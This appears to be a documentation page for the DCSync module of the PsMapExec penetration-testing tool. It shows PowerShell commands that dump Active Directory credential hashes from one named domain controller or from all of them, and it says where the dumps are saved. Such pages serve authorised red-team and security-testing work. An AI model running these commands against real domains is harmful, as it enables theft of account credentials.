# DCSync

Performs DCSync against specified domain controllers. Output for each system is stored in `$pwd\PME\DCSync\DCSync_Full_Dump` unless a specific user is targeted in which case data is stored in `$pwd\PME\DCSync\DCSync_User_Dump`

<pre class="language-powershell"><code class="lang-powershell"># Target a specific DC
PsMapExec -Method dcsync -Targets DC01.security.local -ShowOutput
<strong>
</strong><strong># Target all DCs (Syncs all so very noisy)
</strong>PsMapExec -Method dcsync -Targets DC -ShowOutput
</code></pre>

It is also possible to only sync a single user. It is highly recommended to ensure when doing so, to append the domain netbios name to the username.
